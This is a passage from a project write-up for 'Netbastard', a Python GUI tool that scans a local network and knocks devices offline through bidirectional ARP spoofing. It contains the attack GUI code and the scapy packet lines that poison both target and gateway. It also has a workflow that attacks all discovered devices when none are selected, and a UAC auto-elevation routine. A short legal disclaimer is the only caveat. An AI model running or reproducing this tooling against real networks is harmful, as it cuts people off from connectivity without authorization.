        if self.config.get('theme') == 'dark':
            bg, fg, sel = '#1e1e1e', '#d4d4d4', '#264f78'
            self.root.configure(bg=bg)
            self.style.theme_use('clam')
            self.style.configure('TFrame', background=bg)
            self.style.configure('TLabel', background=bg, foreground=fg)
            self.style.configure('TButton', background='#0e639c', foreground='white', borderwidth=1, focusthickness=0)
            self.style.map('TButton', background=[('active', '#1177bb')])
            self.style.configure('Treeview', background='#252526', foreground=fg, fieldbackground='#252526', rowheight=26)
            self.style.configure('Treeview.Heading', background='#333333', foreground=fg, relief='flat')
            self.style.map('Treeview', background=[('selected', sel)])
            self.style.configure('TLabelframe', background=bg, foreground=fg)
            self.style.configure('TLabelframe.Label', background=bg, foreground=fg)
            self.style.configure('TEntry', fieldbackground='#3c3c3c', foreground=fg)
            self.style.configure('Vertical.TScrollbar', background='#333333', troughcolor='#252526')
            self._dark_bg = bg
            self._dark_fg = fg
        else:
            self._dark_bg = '#f0f0f0'
            self._dark_fg = '#222'

    def _build_ui(self):
        top = ttk.Frame(self.root)
        top.pack(fill=tk.X, padx=8, pady=(8, 2))
        ttk.Label(top, text="Netbastard", font=('Consolas', 16, 'bold'), foreground='#cc4444').pack(side=tk.LEFT, padx=(0, 10))
        self.admin_lbl = ttk.Label(top, text="")
        self.admin_lbl.pack(side=tk.LEFT, padx=5)
        self.update_admin_label()

        ctrl_frame = ttk.Frame(self.root)
        ctrl_frame.pack(fill=tk.X, padx=8, pady=4)
        self.scan_btn = ttk.Button(ctrl_frame, text="Scan Network", command=self.start_scan)
        self.scan_btn.pack(side=tk.LEFT, padx=(0, 5))
        self.stop_scan_btn = ttk.Button(ctrl_frame, text="Stop Attack", command=self.stop_selected)
        self.stop_scan_btn.pack(side=tk.LEFT, padx=5)
        self.stopall_btn = ttk.Button(ctrl_frame, text="Stop All", command=self.stop_all)
        self.stopall_btn.pack(side=tk.LEFT, padx=5)

        self.status_bar = ttk.Label(ctrl_frame, relief=tk.SUNKEN, anchor=tk.W)
        self.status_bar.pack(side=tk.RIGHT, fill=tk.X, expand=True, padx=(10, 0))

        panes = ttk.PanedWindow(self.root, orient=tk.HORIZONTAL)
        panes.pack(fill=tk.BOTH, expand=True, padx=8, pady=4)

        left = ttk.Frame(panes)
        panes.add(left, weight=3)
        right = ttk.Frame(panes)
        panes.add(right, weight=2)

        dev_frame = ttk.LabelFrame(left, text="Devices")
        dev_frame.pack(fill=tk.BOTH, expand=True)
        cols = ('sel', 'ip', 'mac', 'hostname', 'status')
        self.tree = ttk.Treeview(dev_frame, columns=cols, show='headings', height=14, selectmode='extended')
        self.tree.heading('sel', text='')
        self.tree.heading('ip', text='IP Address')
        self.tree.heading('mac', text='MAC Address')
        self.tree.heading('hostname', text='Hostname')
        self.tree.heading('status', text='Status')
        self.tree.column('sel', width=30, anchor=tk.CENTER)
        self.tree.column('ip', width=120)
        self.tree.column('mac', width=130)
        self.tree.column('hostname', width=160)
        self.tree.column('status', width=80)
        self.tree.bind('<ButtonRelease-1>', self.on_tree_click)

        vsb = ttk.Scrollbar(dev_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)

        right_top = ttk.LabelFrame(right, text="Attack Control")
        right_top.pack(fill=tk.BOTH, expand=True)

        info_frame = ttk.Frame(right_top)
        info_frame.pack(fill=tk.X, padx=5, pady=5)
        ttk.Label(info_frame, text="Target IP:").grid(row=0, column=0, sticky=tk.W, padx=2)
        self.target_ip_var = StringVar()
        ttk.Label(info_frame, textvariable=self.target_ip_var, foreground='#cc4444').grid(row=0, column=1, sticky=tk.W, padx=5)
        ttk.Label(info_frame, text="Packets:").grid(row=0, column=2, sticky=tk.W, padx=(15, 2))
        self.pkt_var = StringVar(value="0")
        ttk.Label(info_frame, textvariable=self.pkt_var).grid(row=0, column=3, sticky=tk.W, padx=5)
        ttk.Label(info_frame, text="Status:").grid(row=1, column=0, sticky=tk.W, padx=2)
        self.status_var = StringVar(value="Idle")
        ttk.Label(info_frame, textvariable=self.status_var, foreground='#4ec9b0').grid(row=1, column=1, sticky=tk.W, padx=5)
        ttk.Label(info_frame, text="Duration:").grid(row=1, column=2, sticky=tk.W, padx=(15, 2))
        self.dur_var = StringVar(value="00:00")
        ttk.Label(info_frame, textvariable=self.dur_var).grid(row=1, column=3, sticky=tk.W, padx=5)

        self.attack_btn = ttk.Button(right_top, text="Attack Selected", command=self.attack_selected)
        self.attack_btn.pack(pady=5)

        status_frame = ttk.LabelFrame(right_top, text="Attack Status")
        status_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.status_tree = ttk.Treeview(status_frame, columns=('ip', 'state', 'pkts', 'time'), show='headings', height=6)
        self.status_tree.heading('ip', text='Target')
        self.status_tree.heading('state', text='State')
        self.status_tree.heading('pkts', text='Packets')
        self.status_tree.heading('time', text='Duration')
        self.status_tree.column('ip', width=100)
        self.status_tree.column('state', width=80)
        self.status_tree.column('pkts', width=70)
        self.status_tree.column('time', width=80)
        self.status_tree.pack(fill=tk.BOTH, expand=True)

        log_frame = ttk.LabelFrame(self.root, text="Log")
        log_frame.pack(fill=tk.BOTH, padx=8, pady=(0, 8))
        self.log_area = scrolledtext.ScrolledText(
            log_frame, height=8, font=('Consolas', 9),
            bg=self._dark_bg, fg=self._dark_fg, insertbackground=self._dark_fg
        )
        self.log_area.pack(fill=tk.BOTH, expand=True)
        self.log_area.config(state=tk.DISABLED)

    def update_admin_label(self):
        if self.admin:
            self.admin_lbl.config(text="[ADMIN]", foreground='#4ec9b0')
        else:
            self.admin_lbl.config(text="[USER]", foreground='#cc4444')

    def log(self, msg):
        ts = datetime.now().strftime('%H:%M:%S')
        try:
            self.log_area.config(state=tk.NORMAL)
            self.log_area.insert(tk.END, f"[{ts}] {msg}\n")
            self.log_area.see(tk.END)
            self.log_area.config(state=tk.DISABLED)
        except:
            pass

    def set_status(self, msg):
        self.status_bar.config(text=msg)
        self.root.update_idletasks()

    def auto_detect(self):
        self.log("Detecting network...")
        self.set_status("Detecting network...")
        if self.scanner.detect_network():
            self.log(f"Gateway: {self.scanner.gateway_ip}")
            self.log(f"Local IP: {self.scanner.local_ip}")
            if self.scanner.resolve_gateway_mac():
                self.log(f"Gateway MAC: {self.scanner.gateway_mac}")
            else:
                self.log("Could not resolve gateway MAC - trying scan anyway")
            self.attacker = ARPAttacker(self.scanner)
            self.start_scan()
        else:
            self.log("Could not detect network automatically")
            self.set_status("Network detection failed")
            self.prompt_manual_config()

    def prompt_manual_config(self):
        d = tk.Toplevel(self.root)
        d.title("Manual Network Configuration")
        d.geometry("400x200")
        d.transient(self.root)
        d.grab_set()
        ttk.Label(d, text="Gateway IP:").pack(pady=(15, 2))
        gw_var = StringVar()
        ttk.Entry(d, textvariable=gw_var, width=25).pack()
        ttk.Label(d, text="Your IP:").pack(pady=(10, 2))
        ip_var = StringVar()
        ttk.Entry(d, textvariable=ip_var, width=25).pack()
        def apply():
            gw = gw_var.get().strip()
            ip = ip_var.get().strip()
            if gw and ip:
                try:
                    socket.inet_aton(gw)
                    socket.inet_aton(ip)
                except:
                    messagebox.showerror("Error", "Invalid IP address")
                    return
                self.scanner.gateway_ip = gw
                self.scanner.local_ip = ip
                self.attacker = ARPAttacker(self.scanner)
                self.log(f"Manual config: GW={gw}, IP={ip}")
                d.destroy()
                self.start_scan()
            else:
                messagebox.showerror("Error", "Both fields required")
        ttk.Button(d, text="Apply", command=apply).pack(pady=15)

    def start_scan(self):
        if self.scanning:
            return
        self.scanning = True
        self.scan_btn.config(text="Scanning...", state=tk.DISABLED)
        self.tree.delete(*self.tree.get_children())
        self.set_status("Scanning network...")
        self.log("Network scan started")
        threading.Thread(target=self._do_scan, daemon=True).start()

    def _do_scan(self):
        def progress(done, total):
            self.set_status(f"Scanning... {done}/{total}")
        devices = self.scanner.scan(progress_callback=progress)
        self.root.after(0, self._scan_done, devices)

    def _scan_done(self, devices):
        self.tree.delete(*self.tree.get_children())
        for d in devices:
            ip = d['ip']
            mac = d['mac']
            hostname = d.get('hostname', '') or ''
            atk = self.attacker.attacks.get(ip, {}) if self.attacker else {}
            if atk.get('active'):
                status = 'ATTACK' if not atk.get('online', True) else 'ONLINE'
            else:
                status = 'Online'
            sel = '☑' if atk.get('active') else ''
            self.tree.insert('', tk.END, values=(sel, ip, mac, hostname[:30], status))
        self.scan_btn.config(text="Scan Network", state=tk.NORMAL)
        self.set_status(f"Scan complete: {len(devices)} devices")
        self.log(f"Found {len(devices)} devices")
        self.scanning = False

    def on_tree_click(self, event):
        region = self.tree.identify_region(event.x, event.y)
        if region == 'cell':
            col = self.tree.identify_column(event.x)
            if col == '#1':
                item = self.tree.identify_row(event.y)
                if item:
                    vals = list(self.tree.item(item, 'values'))
                    if vals:
                        vals[0] = '' if vals[0] == '☑' else '☑'
                        self.tree.item(item, values=vals)

    def get_selected_ips(self):
        ips = []
        for item in self.tree.get_children():
            vals = self.tree.item(item, 'values')
            if vals and vals[0] == '☑':
                ips.append(vals[1])
        return ips

    def get_all_device_ips(self):
        ips = []
        for item in self.tree.get_children():
            vals = self.tree.item(item, 'values')
            if vals:
                ips.append(vals[1])
        return ips

    def attack_selected(self):
        if not self.attacker:
            messagebox.showwarning("Warning", "Network not configured")
            return
        targets = self.get_selected_ips()
        if not targets:
            targets = self.get_all_device_ips()
            if not targets:
                messagebox.showwarning("Warning", "No devices found. Scan first.")
                return
        for ip in targets:
            mac = None
            for d in self.scanner.devices:
                if d['ip'] == ip:
                    mac = d['mac']
                    break
            if mac:
                self.attacker.start_attack(ip, mac, self.update_devices)
                self.log(f"Attack started: {ip}")
        self.update_devices()
        self._refresh_status()

    def stop_selected(self):
        if not self.attacker:
            return
        targets = self.get_selected_ips()
        if not targets:
            messagebox.showwarning("Warning", "No targets selected")
            return
        for ip in targets:
            self.attacker.stop_attack(ip, self.update_devices)
            self.log(f"Attack stopped: {ip}")
        self.update_devices()
        self._refresh_status()

    def stop_all(self):
        if self.attacker:
            self.attacker.stop_all(self.update_devices)
            self.log("All attacks stopped")
        self.update_devices()
        self._refresh_status()

    def update_devices(self):
        pass

    def _refresh_status(self):
        if not self.attacker:
            return
        for item in self.status_tree.get_children():
            self.status_tree.delete(item)
        for ip, info in self.attacker.attacks.items():
            if info['active']:
                state = 'OFFLINE' if not info['online'] else 'ONLINE'
                elapsed = datetime.now() - info['started']
                m, s = divmod(int(elapsed.total_seconds()), 60)
                dur = f"{m:02d}:{s:02d}"
                self.status_tree.insert('', tk.END, values=(ip, state, str(info['packets']), dur))

    def refresh_loop(self):
        if not self.running:
            return
        if self.attacker:
            self._refresh_status()
        self.root.after(2000, self.refresh_loop)

    def on_close(self):
        self.running = False
        if self.attacker:
            self.log("Stopping all attacks...")
            self.attacker.stop_all()
        self.root.destroy()

    def run(self):
        self.root.after(2000, self.refresh_loop)
        self.root.mainloop()


def main():
    cfg = load_config()
    if not is_admin() and cfg.get('auto_elevate', True) and os.name == 'nt':
        try:
            script = Path(__file__).resolve()
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{script}"', str(script.parent), 1
            )
            return
        except:
            pass
    app = NetbastardGUI()
    app.run()


if __name__ == '__main__':
    main()
```

---

## CONFIGURATION: config.json

**Path:** `config.json`

```json
{
  "auto_elevate": true,
  "scan_method": "auto",
  "spoof_interval": 1.0,
  "theme": "dark",
  "scan_range": "192.168.1.0/24",
  "refresh_interval": 3
}
```

| Key | Type | Default | Description |
|-----|------|---------|-------------|
| `auto_elevate` | bool | `true` | Auto-request admin via Windows UAC on startup |
| `scan_method` | string | `"auto"` | Scanning method: `auto`, `scapy`, or `api` |
| `spoof_interval` | float | `1.0` | Seconds between ARP packet bursts |
| `theme` | string | `"dark"` | GUI theme: `dark` or `light` |
| `scan_range` | string | `"192.168.1.0/24"` | CIDR range for network scanning |
| `refresh_interval` | int | `3` | Seconds between status refresh |

---

## DEPENDENCIES: requirements.txt

```
scapy>=2.5.0
colorama>=0.4.6
```

**Installation:** `pip install -r requirements.txt`

**Platform requirements:**
- Windows: Npcap (https://npcap.com) installed in WinPcap API-compatible mode
- Linux: No additional platform requirements (uses raw sockets natively)

**Standard library modules used (no pip needed):**
- `socket`, `struct`, `ipaddress` — network operations
- `threading` — concurrent scanning and attack loops
- `subprocess`, `os`, `sys` — system interaction
- `ctypes` — Windows API calls (SendARP, IsUserAnAdmin, ShellExecuteW)
- `json` — config file parsing
- `datetime`, `time` — timing and logging
- `pathlib` — file path handling
- `tkinter`, `tkinter.ttk` — GUI framework (bundled with Python)

---

## TECHNICAL DEEP DIVE

### 1. ARP Protocol Basics

The Address Resolution Protocol (ARP) maps IP addresses to MAC addresses on a local network. When device A wants to communicate with device B, it broadcasts an ARP request ("who has IP B?"), and B replies with its MAC address. The requesting device caches this mapping in its ARP table.

**ARP Packet Structure (Ethernet):**

```
  Ethernet Header:
    Destination MAC (6 bytes)
    Source MAC (6 bytes)
    EtherType (2 bytes) = 0x0806 for ARP

  ARP Body:
    Hardware Type (2) = 1 for Ethernet
    Protocol Type (2) = 0x0800 for IPv4
    Hardware Size (1) = 6
    Protocol Size (1) = 4
    Opcode (2) = 1 (request) or 2 (reply)
    Sender MAC (6)
    Sender IP (4)
    Target MAC (6)
    Target IP (4)
```

### 2. ARP Spoofing Attack Mechanics

Netbastard implements **bidirectional ARP spoofing**:

```
Normal Traffic Flow:
  Target ──────────► Gateway ──────────► Internet
  192.168.1.10      192.168.1.1

Under Attack:
  Target ◄─── ARP Poison ──── Attacker ──── ARP Poison ───► Gateway
              "GW is at      192.168.1.5                   "Target is at
               attacker MAC"                               attacker MAC"

  Result: Target's internet traffic is redirected through the attacker's
  machine. Since netbastard does NOT forward packets, the target loses
  internet connectivity entirely.
```

**Attack packet construction (scapy):**

```python
# Packet sent to TARGET: "I am the gateway"
ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)

# Packet sent to GATEWAY: "I am the target"
ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
```

- `op=2` indicates an ARP REPLY (unsolicited, no request needed)
- `pdst` / `hwdst` = who receives this packet
- `psrc` = who we claim to be (spoofed sender)

### 3. Scanning Mechanisms

**Method A: Scapy ARP Sweep** (requires admin)
- Sends ARP requests to all 254 IPs in /24 subnet
- Uses 50 concurrent threads for speed
- Captures ARP responses containing IP + MAC
- Hostname resolved via `socket.gethostbyaddr()`

**Method B: Windows SendARP API** (no admin needed)
- Uses `iphlpapi.SendARP` via ctypes
- Sends ARP request to each IP and reads response
- Slower but works without elevation
- Same threading model as method A

### 4. Connection Monitoring

Post-attack, the monitor checks if the target is still reachable:
- **Scapy mode:** Sends ARP request, checks for response
- **API mode:** Uses `SendARP()` to probe the target's MAC
- If target fails to respond for multiple cycles, it's marked OFFLINE
- Detection triggers a log event: "Target [IP] has been isolated"

### 5. ARP Table Restoration

When an attack is stopped, legitimate ARP packets are sent to restore normal connectivity:

```python
# Tell gateway the real target MAC
ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
    psrc=target_ip, hwsrc=actual_target_mac)

# Tell target the real gateway MAC
ARP(op=2, pdst=target_ip, hwdst=target_mac,
    psrc=gateway_ip, hwsrc=actual_gateway_mac)
```

Sent 4 times each to ensure delivery.

### 6. Admin Elevation Flow (Windows)

```
User launches netbastard_gui.py (non-admin)
  │
  ├──► main() checks is_admin()
  │      └── False → auto_elevate = True
  │           └── ShellExecuteW("runas", ...)
  │                └── UAC prompt appears
  │                     ├── Accepted → new admin process starts
  │                     └── Denied → continues as non-admin
  │
  └──► NetbastardGUI.__init__()
         └── admin = False
              └── Uses SendARP for scanning (limited)
              └── Uses arp -d for cache disruption (limited)
```

### 7. Non-Admin Fallback Behavior

When running without admin privileges on Windows:
- **Scanning:** Uses `iphlpapi.SendARP` via ctypes — works without admin
- **Attack:** Periodically runs `arp -d <ip>` to flush target's ARP cache — may cause intermittent connectivity but is NOT true ARP spoofing
- **Monitoring:** Uses `SendARP` to detect presence — works without admin
- **Restore:** Cannot send correct ARP entries — manual restoration required

### 8. Threading Model

```
main thread (GUI/CLI)
  │
  ├── scan thread
  │     └── spawns 50 worker threads (one per IP)
  │         each: send ARP, wait for response, record result
  │
  ├── attack thread per target (spoof_loop)
  │     └── infinite loop: send 2 ARP packets, sleep 1s
  │
  └── monitor thread per target (monitor_loop)
        └── infinite loop: probe target, check status, sleep 3s
```

### 9. Key Limitations

| Limitation | Reason |
|-----------|--------|
| Requires admin for full functionality | Raw sockets need elevated privileges |
| Only works within local subnet | ARP is non-routable |
| Ineffective against DAI-enabled switches | Dynamic ARP Inspection validates ARP packets |
| Antivirus may flag as threat | Heuristic detection of ARP poisoning |
| No packet forwarding | Target is isolated, not MITM'd |
| /24 subnet assumed | Hardcoded prefix extraction |

### 10. Security Considerations

- The tool modifies the ARP cache of target devices — this is a denial-of-service technique
- No traffic interception or packet capture is implemented
- All MAC addresses are collected purely from network responses
- The tool does not exfiltrate any data
- ARP table restoration attempts to clean up after itself

---

## USAGE GUIDE

### Installation

```bash
# Clone or download
cd netbastard

# Install dependencies
pip install -r requirements.txt

# Windows: Install Npcap from https://npcap.com
# (Check "Install in WinPcap API-compatible Mode")
```

### CLI Mode

```bash
python netbastard.py
```

**Menu Options:**
```
1  Scan Network      — Discover all devices on the local network
2  List Devices      — Display scanned devices with IP, MAC, hostname
3  Attack Target     — Select a device number to attack
4  Stop Attack       — Stop attacking a specific device
5  Show Status       — Show active attacks with packet count and timing
6  Multi Attack      — Attack multiple devices (comma-separated numbers)
7  Stop All          — Stop all active attacks
8  Quit              — Exit and restore ARP tables
```

### GUI Mode

```bash
python netbastard_gui.py
```

**GUI Elements:**
- **Device Table** (left panel): Lists all discovered devices with checkboxes
- **Attack Control** (right panel): Target info, packet count, status, duration
- **Status Table** (right panel, bottom): Shows all active attacks in real-time
- **Log Area** (bottom): Timestamped event log
- **Control Buttons** (top):
  - `Scan Network` — Start network discovery
  - `Stop Attack` — Stop attacking checked devices
  - `Stop All` — Stop all attacks

**Selection:**
- Click the first column (checkbox column) to toggle device selection
- If no devices are checked, `Attack Selected` attacks ALL discovered devices

### Example Workflow

```
1. Launch:       python netbastard_gui.py
2. Auto-detect:  App detects gateway (192.168.1.1) and local IP
3. Scan:         Click "Scan Network" → discovers 12 devices
4. Select:       Check the device at 192.168.1.10
5. Attack:       Click "Attack Selected" → ARP poisoning starts
6. Monitor:      Status shows ONLINE → OFFLINE after ~5-10 seconds
7. Notification: "Target 192.168.1.10 has been isolated"
8. Stop:         Click "Stop All" → ARP tables restored
9. Verify:       Target regains internet access
```

### Configuration

Edit `config.json`:

```json
{
  "auto_elevate": false,
  "theme": "light",
  "spoof_interval": 0.5
}
```

---

## ETHICAL & LEGAL NOTICE

**WARNING:** ARP spoofing is a network attack technique. This tool is provided for:

- Security testing on networks you OWN
- Penetration testing with WRITTEN PERMISSION
- Educational purposes in CONTROLLED LAB ENVIRONMENTS

**Unauthorized use on networks you do not own or lack explicit permission to test may violate:**
- Computer Fraud and Abuse Act (CFAA) — US
- Computer Misuse Act — UK
- Undang-Undang ITE — Indonesia
- Similar laws in other jurisdictions

**The developers assume no liability for misuse of this software.**
**USE RESPONSIBLY.**

---

*Generated 2026-06-27 — Complete project context for AI model consumption.*
